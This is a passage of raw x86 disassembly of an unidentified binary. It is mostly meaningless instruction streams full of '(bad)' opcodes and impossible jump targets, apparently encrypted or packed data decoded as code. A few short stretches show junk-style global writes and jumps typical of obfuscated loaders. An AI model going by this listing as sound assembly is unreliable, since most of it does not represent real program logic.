  4039f4:	mov    ?,WORD PTR [edi+0x55]
  4039f7:	(bad)  
  4039f8:	loop   0x403a32
  4039fa:	mov    dl,0x58
  4039fc:	and    BYTE PTR [esi],0xf5
  4039ff:	or     esp,esp
  403a01:	sahf   
  403a02:	add    BYTE PTR [edx-0x33c7c35],0x99
  403a09:	mov    ah,0x28
  403a0b:	pop    ecx
  403a0c:	ins    DWORD PTR es:[edi],dx
  403a0d:	mov    cl,0x4b
  403a0f:	into   
  403a10:	cmp    esp,DWORD PTR [eax+0x6a5f9103]
  403a16:	jnp    0x4039b9
  403a18:	outs   dx,DWORD PTR ds:[esi]
  403a19:	or     edx,DWORD PTR [edx]
  403a1b:	je     0x4039bf
  403a1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a1e:	sti    
  403a1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a20:	mov    WORD PTR [esi-0x42],cs
  403a23:	mov    ss,eax
  403a25:	jecxz  0x4039e8
  403a27:	adc    al,0x4d
  403a29:	pop    eax
  403a2a:	adc    DWORD PTR [esi-0x74],ebx
  403a2d:	in     eax,dx
  403a2e:	cmp    DWORD PTR [eax-0x22],ebx
  403a31:	ds push cs
  403a33:	add    edi,DWORD PTR [esi+0x336b8e1]
  403a39:	retf   0xe254
  403a3c:	out    0xcb,al
  403a3e:	push   0x5e98eed7
  403a43:	mov    ecx,0xe0cb4aac
  403a48:	sbb    DWORD PTR [eax+edi*2+0x46d1a67d],edx
  403a4f:	fisub  DWORD PTR [esi-0x663f93b]
  403a55:	stos   DWORD PTR es:[edi],eax
  403a56:	cmp    BYTE PTR [ebp+0x0],al
  403a59:	jge    0x4039f8
  403a5b:	xchg   edi,eax
  403a5c:	(bad)  
  403a5d:	les    ecx,FWORD PTR [esp+eiz*4]
  403a60:	xor    ch,dh
  403a62:	cmc    
  403a63:	loop   0x403a4e
  403a65:	add    al,BYTE PTR [edx+0x4c1a59e4]
  403a6b:	pop    es
  403a6c:	loop   0x403ae5
  403a6e:	sar    DWORD PTR [edi],cl
  403a70:	mov    ebp,0xcb0ca429
  403a75:	cmc    
  403a76:	pop    ecx
  403a77:	call   0x3f936f8e
  403a7c:	mov    es,WORD PTR [edx]
  403a7e:	xchg   edi,eax
  403a7f:	aaa    
  403a80:	mov    dh,0x5b
  403a82:	mov    ebp,0xb4821519
  403a87:	xchg   BYTE PTR [edx+0xf],al
  403a8a:	jl     0x403a15
  403a8c:	test   dl,ch
  403a8e:	out    0xd6,al
  403a90:	push   0xe4a92a0b
  403a95:	test   eax,0xbe65c35b
  403a9a:	das    
  403a9b:	push   es
  403a9c:	sbb    BYTE PTR [edx],0xe7
  403a9f:	mov    WORD PTR [edi+0x1f326ec],cs
  403aa5:	dec    eax
  403aa6:	ds cli 
  403aa8:	adc    dl,BYTE PTR [esi+0x3c]
  403aab:	inc    ebx
  403aac:	pop    ds
  403aad:	mov    WORD PTR [ebx],?
  403aaf:	test   BYTE PTR [esi+edi*2+0xcc7ce41],bl
  403ab6:	(bad)  
  403ab7:	rol    esp,1
  403ab9:	ret    0x1118
  403abc:	and    bh,BYTE PTR [ebx-0x2b]
  403abf:	push   0x7d
  403ac1:	fstp   TBYTE PTR [edx+ebx*1]
  403ac4:	xchg   ecx,eax
  403ac5:	adc    al,ch
  403ac7:	add    ch,BYTE PTR [eax]
  403ac9:	dec    edx
  403aca:	stc    
  403acb:	or     BYTE PTR [esi+0x3b],al
  403ace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403acf:	sbb    dh,BYTE PTR [ecx]
  403ad1:	xchg   ebx,eax
  403ad2:	sahf   
  403ad3:	xchg   ebx,eax
  403ad4:	iret   
  403ad5:	sbb    al,BYTE PTR [edx-0xbbf302b]
  403adb:	(bad)  
  403adc:	sti    
  403add:	pusha  
  403ade:	loopne 0x403b51
  403ae0:	stos   DWORD PTR es:[edi],eax
  403ae1:	stc    
  403ae2:	inc    ebp
  403ae3:	ror    DWORD PTR [eax+0x66],cl
  403ae6:	mov    ch,0x3c
  403ae8:	rol    BYTE PTR [eax+0x18a722a5],1
  403aee:	out    dx,al
  403aef:	jo     0x403a7b
  403af1:	inc    ebp
  403af2:	dec    DWORD PTR [edi]
  403af4:	mov    bh,0xd
  403af6:	imul   esp,edi,0x42
  403af9:	add    BYTE PTR [ecx],dl
  403afb:	or     eax,0x42fdf6
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e1a4,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fd7d,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fd75
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx-0x39752f69],esi
  403b3e:	fwait
  403b3f:	lds    ebx,FWORD PTR [esi]
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0x4470707d
  403b48:	xor    al,0x4f
  403b4a:	aaa    
  403b4b:	sti    
  403b4c:	mov    ah,0xbc
  403b4e:	add    eax,0x8bd4801e
  403b53:	jne    0x403b7c
  403b55:	inc    ebp
  403b56:	jnp    0x403ae5
  403b58:	rol    BYTE PTR [ebp-0x20424f16],0x8f
  403b5f:	mov    edx,?
  403b61:	(bad)  
  403b62:	xchg   esp,eax
  403b63:	imul   edi,esp,0x24
  403b66:	sub    al,0x60
  403b68:	js     0x403af9
  403b6a:	add    eax,eax
  403b6c:	clc    
  403b6d:	adc    al,0xb6
  403b6f:	in     eax,dx
  403b70:	test   eax,0xcc05ee9d
  403b75:	add    DWORD PTR [ebx+0x5477b038],eax
  403b7b:	jne    0x403b17
  403b7d:	retf   0x3c1d
  403b80:	test   DWORD PTR [edx],0x5da3224b
  403b86:	inc    eax
  403b87:	mov    DWORD PTR [ebx-0x4260b7db],eax
  403b8d:	lea    esi,[edx+0x224b423d]
  403b93:	xor    BYTE PTR [ebx],ch
  403b95:	fst    DWORD PTR [edx-0x1053f0e0]
  403b9b:	cmp    al,0xc9
  403b9d:	xlat   BYTE PTR ds:[ebx]
  403b9e:	xor    al,0x3d
  403ba0:	imul   ebx,DWORD PTR [esi],0xcf350ce9
  403ba6:	(bad)  
  403ba7:	out    dx,eax
  403ba8:	pop    DWORD PTR cs:[edi]
  403bab:	cld    
  403bac:	jno    0x403b85
  403bae:	jns    0x403c05
  403bb0:	fstp   DWORD PTR [ebx+edi*4]
  403bb3:	and    DWORD PTR [esi-0x5a3232a6],edi
  403bb9:	pop    edx
  403bba:	xchg   edi,eax
  403bbb:	jbe    0x403b92
  403bbd:	enter  0xca18,0x29
  403bc1:	ss popa 
  403bc3:	xor    eax,0x377063ee
  403bc8:	add    al,0x5b
  403bca:	(bad)  
  403bcb:	int    0x8
  403bcd:	pushf  
  403bce:	xor    eax,0xa3624294
  403bd3:	jb     0x403b84
  403bd5:	cmp    ebp,DWORD PTR ds:0xbf67f14d
  403bdb:	sbb    edx,esi
  403bdd:	test   al,0x8b
  403bdf:	xor    DWORD PTR [esi+ebx*8],esp
  403be2:	enter  0xc23f,0x9b
  403be6:	popa   
  403be7:	sbb    ebp,ebp
  403be9:	mov    al,gs:0xda8df0a0
  403bef:	cmp    ah,ah
  403bf1:	pushf  
  403bf2:	scas   eax,DWORD PTR es:[edi]
  403bf3:	call   0xd3c3:0xe626cfb1
  403bfa:	test   eax,0x47f151e
  403bff:	pop    DWORD PTR [ebp+0x50abd91f]
  403c05:	push   edx
  403c06:	pop    edi
  403c07:	jge    0x403c0a
  403c09:	inc    edx
  403c0a:	xchg   edx,eax
  403c0b:	xor    DWORD PTR [ebx],0x24765e50
  403c11:	push   eax
  403c12:	cmp    eax,DWORD PTR [edx-0x3b]
  403c15:	xchg   esi,eax
  403c16:	mov    edx,0x864226a0
  403c1b:	add    esi,DWORD PTR [ebx+ecx*2-0x3958891a]
  403c22:	xchg   edi,eax
  403c23:	mov    al,0xdf
  403c25:	lods   eax,DWORD PTR ds:[esi]
  403c26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c27:	pop    ecx
  403c28:	loope  0x403c3d
  403c2a:	loope  0x403c83
  403c2c:	xchg   dl,bl
  403c2e:	adc    BYTE PTR [ebp-0x78],0xdb
  403c32:	ins    DWORD PTR es:[edi],dx
  403c33:	push   0x26
  403c35:	and    DWORD PTR ds:0x47c4ba43,esi
  403c3b:	popf   
  403c3c:	adc    eax,0xe6e053df
  403c41:	mov    edi,0xd9b72ba3
  403c46:	out    dx,eax
  403c47:	push   ebx
  403c48:	push   edx
  403c49:	nop
  403c4a:	ds stos BYTE PTR es:[edi],al
  403c4c:	pushf  
  403c4d:	sub    eax,0x27367013
  403c52:	fs clc 
  403c54:	imul   ebx,DWORD PTR [ebp+0x55e3529a],0x2f
  403c5b:	add    al,0x47
  403c5d:	(bad)  
  403c5e:	shl    BYTE PTR [ebx],cl
  403c60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c61:	rcl    BYTE PTR [esi-0x5a],1
  403c64:	xor    BYTE PTR [ecx],dh
  403c66:	scas   eax,DWORD PTR es:[edi]
  403c67:	imul   BYTE PTR [edi]
  403c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c6a:	and    ch,BYTE PTR [edx]
  403c6c:	add    dl,0x15
  403c6f:	push   ds
  403c70:	mov    ds:0x90b58688,eax
  403c75:	dec    esi
  403c76:	mov    edx,0xc480ce13
  403c7b:	push   0x7b
  403c7d:	xor    BYTE PTR [ebx+0x45],bh
  403c80:	mov    ah,0xc2
  403c82:	jno    0x403cb7
  403c84:	in     eax,dx
  403c85:	jmp    DWORD PTR [ebp-0x4c]
  403c88:	xlat   BYTE PTR ds:[ebx]
  403c89:	gs jle 0x403ca5
  403c8c:	aam    0x77
  403c8e:	mov    ebx,0x90771f9f
  403c93:	les    esi,FWORD PTR ds:0xe8640d4f
  403c99:	(bad)  
  403c9a:	popf   
  403c9b:	es test edi,edx
  403c9e:	inc    ebx
  403c9f:	xor    al,0xfe
  403ca1:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  403ca3:	pop    edi
  403ca4:	jb     0x403ce4
  403ca6:	and    al,0x28
  403ca8:	loopne 0x403cd4
  403caa:	cmp    al,ch
  403cac:	cs jb  0x403c68
  403caf:	dec    esi
  403cb0:	cmp    DWORD PTR fs:[ecx+0x5565bc91],ebp
  403cb7:	outs   dx,BYTE PTR ds:[esi]
  403cb8:	push   DWORD PTR ds:0xbedd5c0d
  403cbe:	clc    
  403cbf:	sub    dh,BYTE PTR [edx+edx*8+0x52965d04]
  403cc6:	mov    ch,0x8f
  403cc8:	push   eax
  403cc9:	jg     0x403cb8
  403ccb:	js     0x403d34
  403ccd:	repnz fadd QWORD PTR [esi+edi*1-0x38]
  403cd2:	or     BYTE PTR [edi-0x7a],dl
  403cd5:	add    eax,0x7233d687
  403cda:	ins    DWORD PTR es:[edi],dx
  403cdb:	stos   DWORD PTR es:[edi],eax
  403cdc:	add    bl,dh
  403cde:	dec    ebx
  403cdf:	cmp    eax,0x876e2d18
  403ce4:	mov    bl,0x8d
  403ce6:	fild   DWORD PTR [esi-0x50]
  403ce9:	push   eax
  403cea:	pop    edx
  403ceb:	mov    bh,0x88
  403ced:	jle    0x403cbb
  403cef:	pfsubr mm6,QWORD PTR [eax-0x25]
  403cf4:	or     esp,eax
  403cf6:	jmp    0x403d65
  403cf8:	addr16 add al,0xf9
  403cfb:	add    BYTE PTR [eax],0x7d
  403cfe:	mov    ebp,0xe3923f65
  403d03:	loop   0x403cc7
  403d05:	es fwait
  403d07:	push   edx
  403d08:	mov    dl,0x4e
  403d0a:	pop    DWORD PTR [edi+0x41]
  403d0d:	stos   DWORD PTR es:[edi],eax
  403d0e:	sub    eax,0xcac975fc
  403d13:	sub    esi,ebx
  403d15:	sahf   
  403d16:	fwait
  403d17:	dec    edi
  403d18:	sbb    bh,BYTE PTR gs:[eax-0x52]
  403d1c:	jne    0x403d63
  403d1e:	aam    0xa0
  403d20:	repnz add ah,dl
  403d23:	test   DWORD PTR [edi+0x2e1f4f86],edx
  403d29:	add    DWORD PTR [eax],ebx
  403d2b:	adc    al,0x91
  403d2d:	push   esi
  403d2e:	neg    BYTE PTR ds:0x41d1875f
  403d34:	pop    ds
  403d35:	mov    esp,0x7e21a3d8
  403d3a:	add    DWORD PTR [esi+esi*8],ecx
  403d3d:	xor    al,cl
  403d3f:	loop   0x403cfd
  403d41:	aaa    
  403d42:	add    dl,BYTE PTR [ecx+0x68]
  403d45:	cmp    edx,DWORD PTR [eax-0x30600eae]
  403d4b:	neg    BYTE PTR [esi+0x1a2b1ab0]
  403d51:	loopne 0x403d3c
  403d53:	fs pop eax
  403d55:	nop
  403d56:	int    0xa7
  403d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d59:	dec    edi
  403d5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d5b:	push   0xdff45e33
  403d60:	arpl   WORD PTR [eax],dx
  403d62:	push   es
  403d63:	mov    dl,0x4a
  403d65:	xor    bh,bl
  403d67:	cmp    eax,0x4b8299b3
  403d6c:	(bad)  
  403d6d:	int    0x2c
  403d6f:	repnz mov ?,WORD PTR [edx]
  403d72:	repz ret 0xe353
  403d76:	stos   BYTE PTR es:[edi],al
  403d77:	pop    ss
  403d78:	jae    0x403db2
  403d7a:	outs   dx,BYTE PTR ds:[esi]
  403d7b:	jb     0x403daa
  403d7d:	and    eax,0xa1a97602
  403d82:	pop    esi
  403d83:	dec    esi
  403d84:	out    0x5a,eax
  403d86:	mov    bl,0x64
  403d88:	sub    ebx,DWORD PTR [edx+esi*8-0x3403927c]
  403d8f:	jns    0x403e0d
  403d91:	pop    ds
  403d92:	push   0x6a
  403d94:	sti    
  403d95:	dec    ebx
  403d96:	js     0x403d1d
  403d98:	sbb    eax,0x2448f3bc
  403d9d:	ins    DWORD PTR es:[edi],dx
  403d9e:	gs sti 
  403da0:	sbb    DWORD PTR [ecx],ecx
  403da2:	(bad)  
  403da4:	push   0xffffffb3
  403da6:	xchg   BYTE PTR [ebp+0x65624905],al
  403dac:	push   ebp
  403dad:	imul   ebx,ebx,0xe68659b4
  403db3:	imul   esi,DWORD PTR cs:[ecx-0x5b98059],0x9a0a25f3
  403dbe:	sub    BYTE PTR [edi+0x62],0xb0
  403dc2:	xchg   esp,eax
  403dc3:	bound  esi,QWORD PTR [ecx+0x14309f59]
  403dc9:	outs   dx,DWORD PTR ds:[esi]
  403dca:	add    al,0x5f
  403dcc:	jmp    0xc17b:0x895c7111
  403dd3:	repnz mov cl,ch
  403dd6:	jo     0x403e49
  403dd8:	inc    esp
  403dd9:	mov    ebx,0x3c7c5a2e
  403dde:	sub    BYTE PTR [edx],ah
  403de0:	mov    BYTE PTR gs:[ebx],dl
  403de3:	rcr    BYTE PTR [eax],1
  403de5:	sbb    ebx,ebp
  403de7:	mov    cl,0x84
  403de9:	(bad)  
  403dea:	dec    ebx
  403deb:	push   0xd654adc4
  403df0:	cmp    BYTE PTR [ebx],0x71
  403df3:	pushf  
  403df4:	(bad)  
  403df5:	icebp  
  403df6:	mov    ebp,ebx
  403df8:	sar    al,cl
  403dfa:	ficom  WORD PTR [eax+0x19e5b381]
  403e00:	fdiv   QWORD PTR [eax-0x17]
  403e03:	xor    cl,ch
  403e05:	lds    edi,FWORD PTR [ecx]
  403e07:	mov    BYTE PTR [eax],bh
  403e09:	and    edi,DWORD PTR [ecx+0x0]
  403e0c:	(bad)  
  403e0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e0e:	mov    cl,0xb1
  403e10:	jmp    0x403e15
  403e12:	pop    esi
  403e13:	mov    ebx,0xc2afd3bf
  403e18:	or     eax,0xa4d87658
  403e1d:	xchg   esp,eax
  403e1e:	loop   0x403e34
  403e20:	inc    ecx
  403e21:	scas   al,BYTE PTR es:[edi]
  403e22:	icebp  
  403e23:	outs   dx,BYTE PTR ds:[esi]
  403e24:	lock out 0x60,al
  403e27:	aad    0xb0
  403e29:	lea    edx,[eax]
  403e2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e2c:	hlt    
  403e2d:	sti    
  403e2e:	call   DWORD PTR [eax+0x6d]
  403e31:	mov    DWORD PTR [edi-0x3ee66abe],edx
  403e37:	adc    DWORD PTR [eax+0x47],edi
  403e3a:	jg     0x403e2a
  403e3c:	mov    bl,0xe0
  403e3e:	jge    0x403e44
  403e40:	inc    esp
  403e41:	push   ecx
  403e42:	adc    al,0xd4
  403e44:	dec    eax
  403e45:	test   DWORD PTR [edx],ecx
  403e47:	cld    
  403e48:	icebp  
  403e49:	push   cs
  403e4a:	pop    ds
  403e4b:	aam    0x2f
  403e4d:	aaa    
  403e4e:	addr16 data16 (bad) 
  403e51:	into   
  403e52:	xor    al,0x72
  403e54:	arpl   WORD PTR [ecx],di
  403e56:	xchg   edi,eax
  403e57:	mov    ebx,0xa8fbe428
  403e5c:	inc    ecx
  403e5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e5e:	and    BYTE PTR [ebx+eiz*4+0x6],dl
  403e62:	jno    0x403eb5
  403e64:	stc    
  403e65:	add    eax,0x76c2b013
  403e6a:	(bad)  
  403e6b:	mov    BYTE PTR [edi-0x4189bb09],ah
  403e71:	jnp    0x403e99
  403e73:	pop    esp
  403e74:	retf   0x4d8
  403e77:	lahf   
  403e78:	mov    dh,0x64
  403e7a:	rcl    DWORD PTR [esi],0xce
  403e7d:	pop    eax
  403e7e:	xor    eax,0x1ba7475f
  403e83:	lock dec ebp
  403e85:	(bad)  
  403e86:	daa    
  403e87:	iret   
  403e88:	jbe    0x403e4c
  403e8a:	mov    DWORD PTR [ebp-0x10],0xf89c8530
  403e91:	mov    eax,DWORD PTR [ebp-0x8]
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e19c
  403ea2:	adc    DWORD PTR ds:0x42e78f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fdf2,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fd85,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e76f,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0x1b861c35
  403eec:	sub    edx,eax
  403eee:	sbb    BYTE PTR [ebx],0x70
  403ef1:	jo     0x403f30
  403ef3:	jge    0x403f65
  403ef5:	jo     0x403ed1
  403ef7:	stos   BYTE PTR es:[edi],al
  403ef8:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  403efa:	ret    
  403efb:	scas   al,BYTE PTR es:[edi]
  403efc:	mov    ds:0x4664815e,al
  403f01:	(bad)  
  403f02:	fnsave [ecx-0xb]
  403f05:	xchg   BYTE PTR [ecx-0x18f36b45],bl
  403f0b:	mov    esi,0x6b3fe16c
  403f10:	or     DWORD PTR [esi],esp
  403f12:	xor    al,0x46
  403f14:	cmc    
  403f15:	pop    edx
  403f16:	push   ecx
  403f17:	pop    ebp
  403f18:	sbb    al,0x8c
  403f1a:	ins    DWORD PTR es:[edi],dx
  403f1b:	ftst   
  403f1d:	pop    esp
  403f1e:	repz mov esp,0x75e81997
  403f24:	loopne 0x403f3c
  403f26:	ds xor al,0xca
  403f29:	pop    ss
  403f2a:	in     eax,0xb8
  403f2c:	inc    ebx
  403f2e:	out    dx,al
  403f2f:	xchg   ebx,eax
  403f30:	rcl    BYTE PTR [edi-0x56],cl
  403f33:	xor    al,0xf9
  403f35:	jle    0x403f0f
  403f37:	(bad)  
  403f38:	fmul   QWORD PTR [ecx+0x7da7d926]
  403f3e:	mov    edi,DWORD PTR [eax-0x3699b078]
  403f44:	mov    ecx,0xf2fedb25
  403f49:	xor    DWORD PTR [ebx-0x24],0xffffffe7
  403f4d:	xlat   BYTE PTR ds:[ebx]
  403f4e:	adc    DWORD PTR [ecx],ecx
  403f50:	adc    BYTE PTR es:[ebx],0x89
  403f54:	add    al,0xb9
  403f56:	mov    edi,DWORD PTR [edx-0x7a114bf9]
  403f5c:	sbb    ch,bl
  403f5e:	xor    edx,DWORD PTR [edi-0x76]
  403f61:	in     eax,dx
  403f62:	mov    dl,0xb7
  403f64:	fdivr  DWORD PTR [ebx]
  403f66:	bound  edx,QWORD PTR [edx]
  403f68:	add    DWORD PTR [eax],esp
  403f6a:	push   cs
  403f6b:	cmp    eax,0xd0144a7
  403f70:	nop
  403f71:	pop    edx
  403f72:	arpl   sp,cx
  403f74:	jge    0x403f31
  403f76:	pop    eax
  403f77:	and    al,0x5
  403f79:	jl     0x403faf
  403f7b:	cmp    ecx,ebx
  403f7d:	call   0xc1f843b7
  403f82:	adc    eax,0xa6f530ae
  403f87:	cmp    esp,DWORD PTR [esi-0x13504cbd]
  403f8d:	shr    DWORD PTR [eax],cl
  403f8f:	add    edi,0xc910267f
  403f95:	dec    esi
  403f96:	mov    ebx,0x26ac1f9c
  403f9b:	and    dl,bl
  403f9d:	in     al,0xe1
  403f9f:	jge    0x403f61
  403fa1:	pop    ebp
  403fa2:	adc    DWORD PTR [edx+0x4158e703],edi
  403fa8:	ins    BYTE PTR es:[edi],dx
  403fa9:	das    
  403faa:	push   0xffffffee
  403fac:	shl    DWORD PTR [ebp+ecx*4-0x7a7327b5],1
  403fb3:	gs xchg edi,eax
  403fb5:	xchg   BYTE PTR [edx+0x40],dl
  403fb8:	loope  0x403fb9
  403fba:	fldcw  WORD PTR [ebx]
  403fbc:	push   eax
  403fbd:	out    0x3c,al
  403fbf:	mov    ecx,0x17ede121
  403fc4:	adc    BYTE PTR [eax],0x9e
  403fc7:	fsqrt  
  403fc9:	jns    0x403f74
  403fcb:	jg     0x403f4d
  403fcd:	mov    edx,0xf33a013
  403fd2:	shl    DWORD PTR [ecx],cl
  403fd4:	push   es
  403fd5:	pop    ecx
  403fd6:	jge    0x403f5b
  403fd8:	jbe    0x404052
  403fda:	inc    eax
  403fdb:	add    eax,0x1ab37c70
  403fe0:	imul   ecx,DWORD PTR [edx+edi*1+0x58],0xffffffa2
  403fe5:	sar    BYTE PTR [eax-0x3792fc45],1
  403feb:	scas   eax,DWORD PTR es:[edi]
  403fec:	iret   
  403fed:	retf   0xe2d
  403ff0:	jbe    0x404032
  403ff2:	(bad)  
  403ff4:	dec    esp
  403ff5:	xchg   DWORD PTR [eax-0x17718f9c],esi
  403ffb:	mov    edx,0xed9e3d66
  404000:	sar    BYTE PTR [ebp+0x15b43128],cl
  404006:	jns    0x404052
  404008:	out    dx,eax
  404009:	or     ah,BYTE PTR [ebp+0x187425f6]
  40400f:	call   0xfb89:0x2e1886e0
  404016:	push   eax
  404017:	xor    al,0xed
  404019:	aaa    
  40401a:	xchg   esi,eax
  40401b:	jmp    0x27b:0xa9cb7fd6
  404022:	aam    0x7f
  404024:	adc    al,dl
  404026:	loop   0x40404e
  404028:	pop    esi
  404029:	inc    eax
  40402a:	cmp    bl,BYTE PTR [edx]
  40402c:	ss inc edx
  40402e:	hlt    
  40402f:	fcomp  QWORD PTR [esi]
  404031:	fs inc ecx
  404033:	stc    
  404034:	loope  0x404027
  404036:	outs   dx,DWORD PTR ds:[esi]
  404037:	(bad)  
  404038:	fptan  
  40403a:	out    0xf2,eax
  40403c:	mov    bh,0xd8
  40403e:	lods   eax,DWORD PTR ds:[esi]
  40403f:	cdq    
  404040:	inc    edi
  404041:	cmp    ecx,DWORD PTR [ecx+ebp*1+0x74]
  404045:	sub    BYTE PTR [eax-0x70],0x6e
  404049:	mov    ebx,0xbe59c3d5
  40404e:	lods   al,BYTE PTR ds:[esi]
  40404f:	int    0x41
  404051:	dec    edx
  404052:	pop    ecx
  404053:	ret    
  404054:	ss pushf 
  404056:	mov    esi,0x567e1c05
  40405b:	sbb    DWORD PTR [ecx],ebp
  40405d:	adc    al,BYTE PTR [esi-0x4e]
  404060:	mov    esi,0xcd605bdc
  404065:	dec    edx
  404066:	mov    al,0x6c
  404068:	mov    gs,ebx
  40406a:	out    0x29,al
  40406c:	xor    al,0x50
  40406e:	fs cwde 
  404070:	aad    0x25
  404072:	scas   eax,DWORD PTR es:[edi]
  404073:	push   esp
  404074:	retf   0xb585
  404077:	xchg   DWORD PTR [ebx-0x7aa9788c],ebp
  40407d:	bound  ebx,QWORD PTR [edx+0x4c]
  404080:	faddp  st(7),st
  404082:	push   edi
  404083:	mov    bh,0x15
  404085:	sbb    al,BYTE PTR [ebp-0x6b]
  404088:	inc    ecx
  404089:	fstp   TBYTE PTR [ebx-0x5]
  40408c:	int3   
  40408d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40408e:	leave  
  40408f:	push   edx
  404090:	jns    0x4040e5
  404092:	sbb    al,0xa
  404094:	rol    eax,1
  404096:	imul   ebx,eax,0x62
  404099:	pop    ds
  40409a:	fadd   DWORD PTR es:[eax-0x7d]
  40409e:	push   eax
  40409f:	test   al,0x35
  4040a1:	mov    dh,0xbb
  4040a3:	xchg   ebx,eax
  4040a4:	pusha  
  4040a5:	jg     0x40411a
  4040a7:	popa   
  4040a8:	fidiv  WORD PTR [edx+0x782f08dc]
  4040ae:	mov    ah,0x8a
  4040b0:	sub    DWORD PTR [ebx],ebx
  4040b2:	lods   eax,DWORD PTR ds:[esi]
  4040b3:	add    DWORD PTR [ebp-0x6ae071c6],ebx
  4040b9:	gs push 0x33
  4040bc:	addr16 xchg esi,eax
  4040be:	mov    ebp,0x1d8c4722
  4040c3:	jne    0x404054
  4040c5:	sbb    DWORD PTR [ecx-0x14],ebx
  4040c8:	dec    eax
  4040c9:	add    al,0xda
  4040cb:	mov    edx,0x41bb33dd
  4040d0:	or     eax,0xaf745ef2
  4040d5:	push   ss
  4040d6:	scas   eax,DWORD PTR es:[edi]
  4040d7:	ins    BYTE PTR es:[edi],dx
  4040d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040d9:	(bad)  
  4040da:	dec    ebx
  4040db:	push   eax
  4040dc:	test   ebp,0x3684e67c
  4040e2:	push   ss
  4040e3:	or     cl,cl
  4040e5:	clc    
  4040e6:	push   ecx
  4040e7:	fidivr DWORD PTR [esi+0x40f911df]
  4040ed:	jne    0x40411b
  4040ef:	sbb    eax,esi
  4040f1:	ins    DWORD PTR es:[edi],dx
  4040f2:	mov    ebp,DWORD PTR [esi+0x9]
  4040f5:	mov    bl,0x1c
  4040f7:	lds    ebp,FWORD PTR [eax+0x11caee7d]
  4040fd:	cmp    eax,0xdbebcb54
  404102:	sbb    al,0x89
  404104:	xor    al,bh
  404106:	sbb    BYTE PTR [edi-0x40d46bec],bl
  40410c:	mov    ah,0x28
  40410e:	sbb    al,0x49
  404110:	in     eax,dx
  404111:	xchg   edx,eax
  404112:	cmp    bp,di
  404115:	mov    eax,ds:0xa5bb771d
  40411a:	or     eax,0x7ccfda9f
  40411f:	es mov ebx,0x331a0f0e
  404125:	in     al,0xf
  404127:	mov    ?,WORD PTR [edi+0x21]
  40412a:	xor    edi,DWORD PTR [ecx-0x5e]
  40412d:	lods   al,BYTE PTR ds:[esi]
  40412e:	sbb    eax,0x627b75a5
  404133:	xor    al,0xe4
  404135:	ja     0x40411e
  404137:	mov    dl,0x2c
  404139:	xchg   esp,eax
  40413a:	sub    esp,DWORD PTR [esi-0x13564fbe]
  404140:	sbb    ah,BYTE PTR ds:0x15bd10dc
  404146:	sar    DWORD PTR [edx+0x657718dd],1
  40414c:	jnp    0x404105
  40414e:	not    WORD PTR [bp+di]
  404152:	hlt    
  404153:	lods   eax,DWORD PTR ds:[esi]
  404154:	ins    DWORD PTR es:[edi],dx
  404155:	jne    0x404112
  404157:	inc    edx
  404158:	addr16 fwait
  40415a:	loop   0x40412e
  40415c:	jbe    0x4040ed
  40415e:	dec    edi
  40415f:	xchg   edi,eax
  404160:	je     0x4041ae
  404162:	daa    
  404163:	mov    ?,WORD PTR [ecx+eax*8-0x72]
  404167:	mov    edx,DWORD PTR [eax+0x2815ae94]
  40416d:	xor    al,0xc9
  40416f:	jne    0x40413d
  404171:	outs   dx,DWORD PTR ss:[esi]
  404173:	and    al,0x89
  404175:	mov    al,0xb0
  404177:	adc    DWORD PTR fs:[esp+ebx*1-0x48],ebx
  40417c:	jmp    0x404199
  40417e:	int    0xf6
  404180:	test   eax,0xe6fc4b92
  404185:	cdq    
  404186:	ret    0xc858
  404189:	mov    ebp,0xb7d8ed6e
  40418e:	mov    ebx,0x4c194d55
  404193:	lods   eax,DWORD PTR ds:[esi]
  404194:	pop    esi
  404195:	push   esp
  404196:	pop    esi
  404197:	gs xchg edx,eax
  404199:	lds    esi,FWORD PTR [eax]
  40419b:	in     al,0x3d
  40419d:	push   ebx
  40419e:	or     BYTE PTR [eax+0x1bf4c07d],al
  4041a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041a5:	repz mov ah,0xe3
  4041a8:	hlt    
  4041a9:	ret    
  4041aa:	sub    ch,BYTE PTR [edi]
  4041ac:	xchg   edi,eax
  4041ad:	dec    edi
  4041ae:	dec    ecx
  4041af:	bnd jb 0x4041a5
